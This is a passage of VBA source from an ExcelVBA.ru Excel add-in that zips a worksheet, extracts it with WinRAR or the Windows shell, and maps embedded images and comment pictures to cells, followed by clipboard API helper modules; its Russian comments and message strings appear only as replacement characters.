        RelsFilename$ = relsFolder$ & Dir(DrawingFilename$, vbNormal) & ".rels"
        'Debug.Print Dir(DrawingFilename$, vbNormal), FWF.FileExists(RelsFilename$), RelsFilename$

        Set RelsDic = New Dictionary: Set ImagesDic = New Dictionary
        Set RelsDic = LoadRelsFromXMLfile(RelsFilename$)
        RelsDic.Add "folder", drawingsFolder$

        Select Case FWF.GetFileExtension(DrawingFilename$)
            Case "xml"
                Set ImagesDic = LoadImageListFromXML(DrawingFilename$, RelsDic)
            Case "vml"
                Set ImagesDic = LoadImageListFromVML(DrawingFilename$, RelsDic)
        End Select

        For Each Key In ImagesDic.Keys
            dic.Item(Key) = ImagesDic.Item(Key)
        Next
    Next

    If dic.Count Then Set GetImagesFromWorksheet = dic
    pi.StartNewAction 45, 45, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

    Set RelsDic = Nothing
    Set drawingsFiles = Nothing
End Function

Function LoadImageListFromVML(ByVal filename$, Optional ByRef RelsDic As Dictionary) As Dictionary
    On Error Resume Next
    Set LoadImageListFromVML = New Dictionary

    Dim FileContent$, arr, ID$, Image$, col$, row$, name$, addr$, imagePath$, FillInfo$

    FileContent$ = FWF.ReadTXTfile(filename$)

    arr = Split(GetTags(FileContent$, "v:shape", , , "outerHTML"), ARSEP)
    If UBound(arr) <= 0 Then Debug.Print "images not found": Exit Function

    Dim i&, shapeHTML$
    For i = LBound(arr) To UBound(arr)
        shapeHTML$ = arr(i)
        FillInfo$ = "": FillInfo$ = GetTags(shapeHTML$, "v:fill", , , "outerHTML 1")
        ID$ = GetLastAttributeFromTag(FillInfo$, "o:relid")    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| relid
        ' Debug.Print  GetLastAttributeFromTag("<v:fill o:relid='rId6' o:relid='rId1' o:title='AA103-BL' />","o:relid")
        name$ = GetTags(shapeHTML$, "v:fill", , , "o:title")

        row$ = GetTags(shapeHTML$, "x:Row", , , "innerHTML")
        col$ = GetTags(shapeHTML$, "x:Column", , , "innerHTML")
        'Debug.Print ID$, name$, row$, col$

        If Len(col$) + Len(row$) > 1 Then addr$ = (Val(row$) + 1) & "-" & (Val(col$) + 1) & "-comment"

        If RelsDic.Exists(ID$) Then
            imagePath$ = RelsDic.Item("folder") & Replace(RelsDic.Item(ID$), "/", "\")
            imagePath$ = Replace(imagePath$, "drawings\..\", "")
        Else
            'imagePath$ = ID$ & " not found"
        End If

        If (Len(addr$) > 0) And (Len(imagePath$) > 0) Then LoadImageListFromVML.Item(addr$) = imagePath$ & "|" & name$
    Next i
End Function

Function GetLastAttributeFromTag(ByVal content$, ByVal AttrName$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| HTML |fffd||fffd||fffd||fffd| content$
    On Error Resume Next: Dim attr$, arr
    attr$ = "": content$ = Split(content$, ">")(0)
    content$ = Replace(Replace(Replace(content$, "= ", "="), " =", "="), vbTab, " ")
    arr = Split(content$, " " & AttrName$ & "=")
    attr$ = Trim(arr(UBound(arr)))
    Select Case Mid(attr$, 1, 1)
        Case """", "'": attr$ = Split(attr$, Mid(attr$, 1, 1))(1)
        Case Else: attr$ = Split(attr$, " ")(0)
    End Select
    GetLastAttributeFromTag = ReplaceNamedCharacters(attr$)        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|  &amp; |fffd||fffd| & (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
End Function

Function LoadImageListFromXML(ByVal filename$, Optional ByRef RelsDic As Dictionary) As Dictionary
    On Error Resume Next
    Set LoadImageListFromXML = New Dictionary

    Dim xml As DOMDocument, XMLoptions As Object, XMLoption As Object, ID$, Image$, col$, row$, name$, addr$, imagePath$
    Set xml = CreateObject("Microsoft.XMLDOM")
    If Not xml.Load(filename$) Then Debug.Print "Error loading XML file": Exit Function
    Set XMLoptions = xml.DocumentElement.SelectNodes("//xdr:twoCellAnchor")
    If XMLoptions.Length = 0 Then Exit Function

    For Each XMLoption In XMLoptions
        col$ = "": row$ = "": ID$ = "": addr$ = "": imagePath$ = ""
        col$ = XMLoption.SelectSingleNode("xdr:from/xdr:col").text
        row$ = XMLoption.SelectSingleNode("xdr:from/xdr:row").text
        If Len(col$) + Len(row$) > 1 Then addr$ = (Val(row$) + 1) & "-" & (Val(col$) + 1) & "-image"

        ID$ = XMLoption.SelectSingleNode("xdr:pic/xdr:blipFill/a:blip").Attributes.getNamedItem("r:embed").text
        name$ = XMLoption.SelectSingleNode("xdr:pic/xdr:nvPicPr/xdr:cNvPr").Attributes.getNamedItem("name").text

        If RelsDic.Exists(ID$) Then
            imagePath$ = RelsDic.Item("folder") & Replace(RelsDic.Item(ID$), "/", "\")
            imagePath$ = Replace(imagePath$, "drawings\..\", "")
        Else
            imagePath$ = ID$ & " not found"
        End If

        If (Len(addr$) > 0) And (Len(imagePath$) > 0) Then LoadImageListFromXML.Item(addr$) = imagePath$ & "|" & name$
    Next
    Set xml = Nothing
End Function

Function LoadRelsFromXMLfile(ByVal filename$) As Dictionary
    On Error Resume Next
    Set LoadRelsFromXMLfile = New Dictionary

    Dim xml As DOMDocument, XMLoptions As Object, XMLoption As Object, ID$, Image$
    Set xml = CreateObject("Microsoft.XMLDOM")
    If Not xml.Load(filename$) Then Debug.Print "Error loading XML file": Exit Function
    Set XMLoptions = xml.DocumentElement.SelectNodes("//Relationship")
    If XMLoptions.Length = 0 Then Exit Function

    For Each XMLoption In XMLoptions
        ID$ = XMLoption.Attributes.getNamedItem("Id").text
        Image$ = XMLoption.Attributes.getNamedItem("Target").text
        LoadRelsFromXMLfile.Item(ID$) = Image$
    Next
    Set xml = Nothing
End Function

Function SaveSheetAsZIP(Optional ByRef sh As Worksheet, Optional filename$, Optional ByRef ErrMsg$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| XLSX |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| *.zip
    ' |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| zip
    On Error Resume Next
    Dim WBname$, folder$
    If Val(Application.Version) < 12 Then ErrMsg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| MS Office (|fffd||fffd||fffd||fffd||fffd| Excel 2007 |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)": Exit Function

    If sh Is Nothing Then Set sh = ActiveSheet
    If sh Is Nothing Then ErrMsg$ = "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|": Exit Function
    WBname$ = sh.Parent.name

    Application.ScreenUpdating = False: Err.Clear
    sh.Copy: DoEvents
    If Err Then ErrMsg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": Exit Function

    If ActiveWorkbook.Worksheets.Count > 1 Then ErrMsg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| 1)": Exit Function
    If ActiveWorkbook.name = WBname$ Then ErrMsg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| 2)": Exit Function

    If ActiveWorkbook.Worksheets(1).name <> sh.name Then ErrMsg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| 3)": Exit Function

    If filename$ = "" Then
        folder$ = Environ("TEMP") & "\Excel_ZIP\"
        If Dir(folder$, vbDirectory) = "" Then MkDir folder$
        filename$ = folder$ & "sheet_" & Format(Now, "YYYY-MM-DD--HH-NN-SS") & "_" & Val(Timer * 100#) & ".zip"
    End If

    Application.DisplayAlerts = False: Err.Clear
    With ActiveWorkbook
        .SaveAs filename$, xlOpenXMLWorkbook
        .Close False
    End With
    Application.DisplayAlerts = True
    If Err Then ErrMsg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| Excel |fffd||fffd| |fffd||fffd||fffd||fffd|" & vbNewLine & """" & filename$ & """": Exit Function
    Application.ScreenUpdating = True

    SaveSheetAsZIP = filename$
End Function

Function ExtractFromArchieve(ByVal SourceFile$, Optional ByVal DestinationFolder$, _
                             Optional ByVal Mask$, Optional AllowWinRAR As Boolean = True, Optional ByRef err_msg$) As String
    ' |fffd| 2018 ExcelVBA.ru
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| SourceFile$ |fffd| |fffd||fffd||fffd||fffd||fffd| DestinationFolder$ |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Mask$
    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| AllowWinRAR = TRUE, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinRAR.exe
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next

    If SourceFile$ = "" Then err_msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|</b>": Exit Function

    If Dir(SourceFile$, vbNormal) = "" Then err_msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & SourceFile$: Exit Function

    Dim PathArr, filename$, DestinationFolderName$, WinRAR_Used As Boolean, res, WinRAR_AppPath$, WinRAR_Command$
    If DestinationFolder$ = "" Then
        Const FOLDER_SUFFIX$ = "Extracted.Files"
        PathArr = Split(SourceFile$, "\"): filename$ = PathArr(UBound(PathArr))
        DestinationFolderName$ = filename$ & "." & FOLDER_SUFFIX$
        If filename$ Like "*.*" Then DestinationFolderName$ = Left(filename$, InStrRev(filename$, ".")) & FOLDER_SUFFIX$
        PathArr(UBound(PathArr)) = DestinationFolderName$
        DestinationFolder$ = Join(PathArr, "\")
    End If
    If Right(DestinationFolder$, 1) <> "\" Then DestinationFolder$ = DestinationFolder$ & "\"

    With CreateObject("Scripting.FileSystemObject")
        If .FolderExists(DestinationFolder$) Then
            If InStr(1, DestinationFolder$, FOLDER_SUFFIX$, vbTextCompare) Then
                .DeleteFile DestinationFolder$ & "*.*", True
                .DeleteFolder DestinationFolder$ & "*.*", True
            End If
        End If
        MkDir DestinationFolder$
        DoEvents
        If Not .FolderExists(DestinationFolder$) Then
            err_msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & DestinationFolder$
            Exit Function
        End If
    End With

    If (Mask$ = "") Or (InStr(1, Mask$, " ") > 0) Or (InStr(1, Mask$, """") > 0) Then Mask$ = "*"

    If AllowWinRAR Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinRAR
        With CreateObject("Wscript.Shell")
            WinRAR_AppPath$ = .RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe\")
            If WinRAR_AppPath$ = "" Then WinRAR_AppPath$ = Split(.RegRead("HKCR\WinRAR\shell\open\command\"), """")(1)
        End With

        If SETT.GetBoolean("CheckBox_Export_DoNotExtractFiles") Then Mask$ = "*ml -n*rels"
        If Dir(WinRAR_AppPath$) <> "" Then
            WinRAR_Command$ = """" & WinRAR_AppPath$ & """ X -o+ -ac -ibck -inul -n" & Mask$ & " """ & SourceFile$ & """ """ & DestinationFolder$ & """"
            res = Shell(WinRAR_Command$, vbHide)
            If Val(res) <> 0 Then WinRAR_Used = True
        End If
    End If

    Dim coll As Collection, i&, arr, CurrentFilesCount&, PreviuosFileCount&, oApp As Object, fileNameInZip
    If Not WinRAR_Used Then    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| Windows, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| WinRAR
        Set oApp = CreateObject("Shell.Application")
        For Each fileNameInZip In oApp.Namespace(CVar(SourceFile$)).Items
            If fileNameInZip Like Mask$ Then
                oApp.Namespace(CVar(DestinationFolder$)).CopyHere oApp.Namespace(CVar(SourceFile$)).Items.Item(CStr(fileNameInZip)), 1024 + 16
            End If
        Next
        Set oApp = Nothing
    End If

    DoEvents
    Set coll = FilenamesCollection(DestinationFolder$, "*")

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 0,3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|,
    ' |fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    PreviuosFileCount& = coll.Count

    Dim TimeStamp As Double, ProcessTime$, StartTime As Double
    'ProcessTime$ = Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|."
    StartTime = Timer
    Do
        If CurrentFilesCount& Then PreviuosFileCount& = CurrentFilesCount&
        TimeStamp = Timer
        While Abs(Timer - TimeStamp) < 0.3: DoEvents: Wend
        Set coll = FilenamesCollection(DestinationFolder$, "*")
        CurrentFilesCount& = coll.Count
    Loop While (CurrentFilesCount& > PreviuosFileCount&) And (Abs(Timer - StartTime) < 10)

    If coll.Count = 0 Then Exit Function
    '    ReDim arr(1 To coll.Count)
    '    For i = LBound(arr) To UBound(arr)
    '        arr(i) = coll(i)
    '    Next i
    ExtractFromArchieve = DestinationFolder$
End Function


Private Sub test_LoadImageListFromXML()
    Dim RelsDic As Dictionary, Key
    Set RelsDic = LoadImageListFromXML("C:\Users\D395~1\AppData\Local\Temp\Excel_ZIP\sheet_2018-11-25--23-13-33_8361347.Extracted.Files\xl\drawings\drawing1.xml")

    Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & RelsDic.Count
    For Each Key In RelsDic.Keys
        Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| " & Key & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & RelsDic.Item(Key)
    Next
End Sub

Private Sub test_LoadImageListFromVML()
    Dim RelsDic As Dictionary, Key
    Set RelsDic = LoadImageListFromVML("C:\Users\D395~1\AppData\Local\Temp\Excel_ZIP\sheet_2018-11-25--23-13-33_8361347.Extracted.Files\xl\drawings\vmlDrawing1.vml")

    Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & RelsDic.Count
    For Each Key In RelsDic.Keys
        Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| " & Key & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & RelsDic.Item(Key)
    Next
End Sub

Private Sub test_LoadRelsFromXMLfile()
    Dim RelsDic As Dictionary, Key
    Set RelsDic = LoadRelsFromXMLfile("C:\Users\D395~1\AppData\Local\Temp\Excel_ZIP\sheet_2018-11-25--23-13-33_8361347.Extracted.Files\xl\drawings\_rels\vmlDrawing1.vml.rels")

    Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & RelsDic.Count
    For Each Key In RelsDic.Keys
        Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| " & Key & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & RelsDic.Item(Key)
    Next
End Sub


Attribute VB_Name = "shh"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "shtr"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 08.01.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Const prefix$ = "MENU"

Function NewTranslateID() As String
    On Error Resume Next
    Dim ra As Range, coll As New Collection
    Set ra = shtr.Range(shtr.Range("a" & TRANSLATE_SHEET_FIRST_ROW), shtr.Range("A" & shtr.Rows.Count).End(xlUp))
    arr = ra.Value
    For i = LBound(arr) To UBound(arr)
        coll.Add arr(i, 1), CStr(arr(i, 1))
    Next i

    For i = 1 To 1000
        Err.Clear: ID$ = prefix$ & "_" & Format(i, "0000")
        coll.Add ID$, ID$
        If Err = 0 Then NewTranslateID = ID$: Exit Function
    Next
    MsgBox "Can't create ID$", vbExclamation, "Function NewTranslateID()"
End Function

Function clipBoardText()
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .GetFromClipboard
        clipBoardText = .GetText
    End With
End Function

Sub SetClipboardText(ByVal txt$)
    With GetObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
        .SetText txt$
        .PutInClipboard
    End With
End Sub

Private Sub Worksheet_BeforeDoubleClick(ByVal Target As Range, Cancel As Boolean)
    On Error Resume Next
    If Target.Column = 1 And Target.Cells.Count = 1 Then
        If Target <> "" Then Cancel = True: SetClipboardText "tt(""" & Target & """) "
    End If
End Sub

Attribute VB_Name = "vbaClipboard"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
' https://social.msdn.microsoft.com/Forums/office/en-US/ee9e0d28-0f1e-467f-8d1d-1a86b2db2878/a-clipboard-object-for-vba-including-microsoft-word
' modified by me (64-bit version added)

Option Explicit

#If Win64 Then
    Private Declare PtrSafe Function CreateFileW Lib "kernel32.dll" (ByVal lpFileName As LongPtr, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByRef lpSecurityAttributes As Any, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As LongPtr) As LongPtr
    Private Declare PtrSafe Function CloseHandle Lib "kernel32.dll" (ByVal hObject As LongPtr) As LongPtr
    Private Declare PtrSafe Function WriteFile Lib "kernel32.dll" (ByVal hFile As LongPtr, ByRef lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, ByRef lpNumberOfBytesWritten As Long, ByRef lpOverlapped As Any) As LongPtr
#Else
    Private Declare Function CreateFileW Lib "kernel32.dll" (ByVal lpFileName As Long, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByRef lpSecurityAttributes As Any, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
    Private Declare Function CloseHandle Lib "kernel32.dll" (ByVal hObject As Long) As Long
    Private Declare Function WriteFile Lib "kernel32.dll" (ByVal hFile As Long, ByRef lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, ByRef lpNumberOfBytesWritten As Long, ByRef lpOverlapped As Any) As Long
#End If

Private Const CREATE_ALWAYS As Long = 2
Private Const GENERIC_WRITE As Long = &H40000000

#If VBA7 Then        ' Office 2010-2013
    Private Declare PtrSafe Function OpenClipboard Lib "user32" (ByVal hwnd As LongPtr) As Long
    Private Declare PtrSafe Function CloseClipboard Lib "user32" () As Long
    Private Declare PtrSafe Function EmptyClipboard Lib "user32" () As Long
    Private Declare PtrSafe Function EnumClipboardFormats Lib "user32" (ByVal wFormat As Long) As Long
    Private Declare PtrSafe Function GetClipboardFormatName Lib "user32" Alias "GetClipboardFormatNameA" (ByVal wFormat As Long, ByVal lpString As String, ByVal nMaxCount As Long) As Long
    Private Declare PtrSafe Function RegisterClipboardFormat Lib "user32" Alias "RegisterClipboardFormatA" (ByVal lpString As String) As Long

    'Note that we do not use the GetClipboardDataA declaration
    'Public Declare PtrSafe Function GetClipboardData Lib "user32" Alias "GetClipboardDataA" (ByVal wFormat As Long) As Long
    Private Declare PtrSafe Function GetClipBoardData Lib "user32" Alias "GetClipboardData" (ByVal wFormat As Long) As LongPtr

    Private Declare PtrSafe Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As LongPtr) As LongPtr
    Private Declare PtrSafe Function GlobalLock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
    Private Declare PtrSafe Function GlobalUnlock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr

    'NOTE: the lstrCpy declaration you get from the VB6 API Viewer is WRONG. It's version is this:
    'Private Declare PtrSafe Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
    'The correct version for (at least for Windows 7 / 64-bit is this:
    Private Declare PtrSafe Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As Any, ByVal lpString2 As Any) As LongPtr

    Private Declare PtrSafe Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Long) As Long
    Private Declare PtrSafe Function GlobalSize Lib "kernel32" (ByVal hMem As LongPtr) As Long
    Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As LongPtr
    Private Declare PtrSafe Function GlobalFree Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr

#Else        ' Office 2003-2007
    Private Declare Function OpenClipboard Lib "user32" (ByVal hwnd As Long) As Long
    Private Declare Function CloseClipboard Lib "user32" () As Long
    Private Declare Function EmptyClipboard Lib "user32" () As Long
    Private Declare Function EnumClipboardFormats Lib "user32" (ByVal wFormat As Long) As Long
    Private Declare Function GetClipboardFormatName Lib "user32" Alias "GetClipboardFormatNameA" (ByVal wFormat As Long, ByVal lpString As String, ByVal nMaxCount As Long) As Long
    Private Declare Function RegisterClipboardFormat Lib "user32" Alias "RegisterClipboardFormatA" (ByVal lpString As String) As Long

    'Note that we do not use the GetClipboardDataA declaration
    'Public Declare Function GetClipboardData Lib "user32" Alias "GetClipboardDataA" (ByVal wFormat As Long) As Long
    Private Declare Function GetClipBoardData Lib "user32" Alias "GetClipboardData" (ByVal wFormat As Long) As Long

    Private Declare Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As Long) As Long
    Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
    Private Declare Function GlobalUnlock Lib "kernel32" (ByVal hMem As Long) As Long

    'NOTE: the lstrCpy declaration you get from the VB6 API Viewer is WRONG. It's version is this:
    'Private Declare Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
    'The correct version for (at least for Windows 7 / 64-bit is this:
    Private Declare Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As Any, ByVal lpString2 As Any) As Long

    Private Declare Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Long) As Long
    Private Declare Function GlobalSize Lib "kernel32" (ByVal hMem As Long) As Long
    Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
    Private Declare Function GlobalFree Lib "kernel32" (ByVal hMem As Long) As Long
#End If

Private Const GMEM_MOVEABLE = &H2
Private Const GMEM_ZEROINIT = &H40
Private Const GHND = (GMEM_MOVEABLE Or GMEM_ZEROINIT)    'Use for hwnd
Private Const NAME_MAX_LENGTH = 1024

Private Const APINULL = 0
Private Const CF_TEXT = 1    'Text format. Each line ends with a carriage return/linefeed (CR-LF) combination. A null character signals the end of the data. Use this format for ANSI text.
Private Const CF_BITMAP = 2    'A handle to a bitmap (HBITMAP).
Private Const CF_METAFILEPICT = 3    'Handle to a metafile picture format as defined by the METAFILEPICT structure. When passing a CF_METAFILEPICT handle by means of DDE, the application responsible for deleting hMem should also free the metafile referred to by the CF_METAFILEPICT handle.
Private Const CF_SYLK = 4    'Microsoft Symbolic Link (SYLK) format.
Private Const CF_TIFF = 6    'Tagged-image file format.
Private Const CF_DIF = 5    'Software Arts' Data Interchange Format.
Private Const CF_OEMTEXT = 7    'Text format containing characters in the OEM character set. Each line ends with a carriage return/linefeed (CR-LF) combination. A null character signals the end of the data.
Private Const CF_DIB = 8    'A memory object containing a BITMAPINFO structure followed by the bitmap bits.
Private Const CF_PALETTE = 9    'Handle to a color palette. Whenever an application places data in the clipboard that depends on or assumes a color palette, it should place the palette on the clipboard as well.
Private Const CF_PENDATA = 10    'Data for the pen extensions to the Microsoft Windows for Pen Computing.
Private Const CF_RIFF = 11    'Represents audio data more complex than can be represented in a CF_WAVE standard wave format.
Private Const CF_WAVE = 12    'Represents audio data in one of the standard wave formats, such as 11 kHz or 22 kHz PCM.
Private Const CF_UNICODETEXT = 13    'Unicode text format. Each line ends with a carriage return/linefeed (CR-LF) combination. A null character signals the end of the data.
Private Const CF_ENHMETAFILE = 14    'A handle to an enhanced metafile (HENHMETAFILE).
Private Const CF_HDROP = 15  'A handle to type HDROP that identifies a list of files. An application can retrieve information about the files by passing the handle to the DragQueryFile function.
Private Const CF_LOCALE = 16    'The data is a handle to the locale identifier associated with text in the clipboard. When you close the clipboard, if it contains CF_TEXT data but no CF_LOCALE data, the system automatically sets the CF_LOCALE format to the current input language. You can use the CF_LOCALE format to associate a different locale with the clipboard text.
